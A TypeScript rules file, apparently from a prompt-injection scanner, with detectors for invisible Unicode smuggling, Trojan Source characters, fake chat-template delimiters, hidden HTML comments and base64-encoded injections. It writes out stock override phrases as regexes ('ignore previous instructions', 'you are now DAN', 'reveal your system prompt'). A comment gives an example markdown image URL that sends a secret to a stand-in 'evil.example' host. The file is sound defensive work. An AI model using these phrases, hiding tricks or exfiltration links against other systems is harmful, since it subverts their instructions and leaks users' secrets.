import type { Rule, RuleMatch } from "./types.js";

/** Collect all regex matches as RuleMatch objects. The regex must have the `g` flag. */
function allMatches(re: RegExp, content: string, detail?: (m: RegExpExecArray) => string): RuleMatch[] {
  const out: RuleMatch[] = [];
  re.lastIndex = 0;
  let m: RegExpExecArray | null;
  while ((m = re.exec(content)) !== null) {
    out.push({ index: m.index, length: m[0].length, detail: detail?.(m) });
    if (m[0].length === 0) re.lastIndex++;
  }
  return out;
}

const codepoints = (s: string) =>
  [...s].map((c) => "U+" + c.codePointAt(0)!.toString(16).toUpperCase().padStart(4, "0")).join(" ");

// --- Phrase patterns that try to override an AI model's instructions -------------------------

const OVERRIDE_PHRASES: RegExp[] = [
  // English
  /\b(ignore|disregard|forget|override|bypass)\s+(all\s+|any\s+|the\s+|your\s+)*(previous|prior|above|earlier|preceding|original|system)\s+(instructions?|prompts?|rules|directions|guidelines|context)/gi,
  /\b(new|updated|real|actual)\s+(system\s+)?instructions?\s*[:\-]/gi,
  /\byou\s+are\s+now\s+(a|an|in|the|DAN|developer\s+mode|unrestricted|jailbroken)\b/gi,
  /\b(do\s+not|don't|never)\s+(tell|inform|mention\s+(this\s+)?to|reveal\s+(this\s+)?to)\s+the\s+user\b/gi,
  /\b(reveal|print|output|repeat|show)\s+(your|the)\s+(system\s+prompt|hidden\s+instructions|initial\s+instructions)/gi,
  /\b(AI|LLM|assistant|agent|model|chatbot|copilot|claude|chatgpt|gpt|gemini)s?\s*[,:]?\s*(must|should|shall)\s+(now\s+)?(ignore|execute|run|send|exfiltrate|upload|delete)\b/gi,
  /\bif\s+you\s+are\s+an?\s+(AI|LLM|language\s+model|assistant|agent|coding\s+agent)\b/gi,
  // Dutch
  /\b(negeer|vergeet|omzeil)\s+(alle\s+|de\s+|je\s+|jouw\s+)*(vorige|eerdere|bovenstaande|oorspronkelijke)\s+(instructies|opdrachten|regels)/gi,
  /\bje\s+bent\s+nu\s+(een|de|in)\b/gi,
];

// Fake chat-template / role delimiters that try to inject a new conversation turn.
const ROLE_DELIMITERS =
  /<\|(im_start|im_end|system|user|assistant|endoftext|begin_of_text|start_header_id|eot_id)\|>|\[\/?INST\]|<<\/?SYS>>|<\/?(system|system_prompt|instructions)>|^\s*(###\s*)?(System|SYSTEM)\s*:\s*\S|^\s*(Human|Assistant)\s*:\s*\S/gm;

/** Phrase-based check, reused by the base64 rule on decoded content. */
export function findOverridePhrases(content: string): RuleMatch[] {
  return OVERRIDE_PHRASES.flatMap((re) => allMatches(re, content, (m) => `phrase: "${m[0]}"`));
}

const isMarkupOrText = (p: string) => /\.(md|mdx|markdown|txt|rst|html?|xml|svg|ya?ml|json|toml|csv|adoc)$/i.test(p) || !/\.[^/]+$/.test(p);

export const RULES: Rule[] = [
  {
    id: "PI001",
    title: "Unicode tag characters (invisible ASCII smuggling)",
    severity: "critical",
    // U+E0000–U+E007F map 1:1 to ASCII but render as nothing; used to hide instructions from humans.
    match: (c) =>
      allMatches(/[\u{E0000}-\u{E007F}]+/gu, c, (m) => {
        const decoded = [...m[0]]
          .map((ch) => String.fromCharCode(ch.codePointAt(0)! - 0xe0000))
          .join("")
          .replace(/[^\x20-\x7E]/g, "?");
        return `hidden text decodes to: "${decoded.slice(0, 200)}"`;
      }),
  },
  {
    id: "PI002",
    title: "Bidirectional control characters (Trojan Source)",
    severity: "high",
    match: (c) => allMatches(/[‪-‮⁦-⁩]/g, c, (m) => codepoints(m[0])),
  },
  {
    id: "PI003",
    title: "Cluster of zero-width characters",
    severity: "medium",
    // A single ZWJ is normal in emoji; 3+ in a row is a common way to encode hidden data.
    match: (c) =>
      allMatches(/[​‌‍⁠⁢⁣⁤﻿]{3,}/g, c, (m) => `${[...m[0]].length} zero-width chars`).filter(
        (r) => r.index !== 0, // BOM at start of file is fine
      ),
  },
  {
    id: "PI010",
    title: "Instruction-override phrase aimed at an AI model",
    severity: "high",
    match: findOverridePhrases,
  },
  {
    id: "PI011",
    title: "Fake chat-template or role delimiter",
    severity: "medium",
    appliesTo: isMarkupOrText,
    match: (c) => allMatches(ROLE_DELIMITERS, c, (m) => `delimiter: "${m[0].trim()}"`),
  },
  {
    id: "PI020",
    title: "Hidden HTML comment addressing an AI model",
    severity: "high",
    appliesTo: isMarkupOrText,
    match: (c) =>
      allMatches(/<!--([\s\S]*?)-->/g, c).filter((r) => {
        const body = c.slice(r.index, r.index + r.length);
        return /\b(AI|LLM|assistant|agent|claude|chatgpt|gpt|copilot|gemini|cursor|model)\b/i.test(body) &&
          /\b(ignore|instruction|must|should|execute|run|send|do not tell|don't tell|system prompt|negeer)\b/i.test(body);
      }),
  },
  {
    id: "PI021",
    title: "CSS-hidden text in markup",
    severity: "medium",
    appliesTo: (p) => /\.(md|mdx|html?|svg)$/i.test(p),
    match: (c) =>
      allMatches(
        /<[a-z]+[^>]*style\s*=\s*["'][^"']*(display\s*:\s*none|visibility\s*:\s*hidden|font-size\s*:\s*0(px)?\s*[;"']|opacity\s*:\s*0\s*[;"'])[^>]*>[^<]{20,}/gi,
        c,
        () => "text inside an element styled to be invisible",
      ),
  },
  {
    id: "PI030",
    title: "Base64 blob that decodes to an injection phrase",
    severity: "high",
    match: (c) => {
      const out: RuleMatch[] = [];
      for (const r of allMatches(/[A-Za-z0-9+/]{40,}={0,2}/g, c)) {
        const blob = c.slice(r.index, r.index + r.length);
        let decoded: string;
        try {
          decoded = Buffer.from(blob, "base64").toString("utf8");
        } catch {
          continue;
        }
        // Only consider blobs that decode to mostly printable text.
        const printable = decoded.replace(/[^\x20-\x7E\n\r\t]/g, "").length;
        if (decoded.length === 0 || printable / decoded.length < 0.9) continue;
        const hits = findOverridePhrases(decoded);
        if (hits.length > 0) out.push({ ...r, detail: `decodes to: "${decoded.slice(0, 160).replace(/\s+/g, " ")}"` });
      }
      return out;
    },
  },
  {
    id: "PI040",
    title: "Markdown image/link that may exfiltrate data via URL parameters",
    severity: "medium",
    appliesTo: isMarkupOrText,
    // e.g. ![x](https://evil.example/log?data={{secret}}) or ...?q=$API_KEY — placeholders an agent may fill in.
    match: (c) =>
      allMatches(
        /!?\[[^\]]*\]\(https?:\/\/[^)\s]+\?[^)\s]*(\{\{|\{[A-Za-z_]+\}|\$\{?[A-Z_]{3,}|<[A-Za-z_ ]+>)[^)\s]*\)/g,
        c,
        () => "URL contains a placeholder an AI agent could fill with sensitive data",
      ),
  },
];
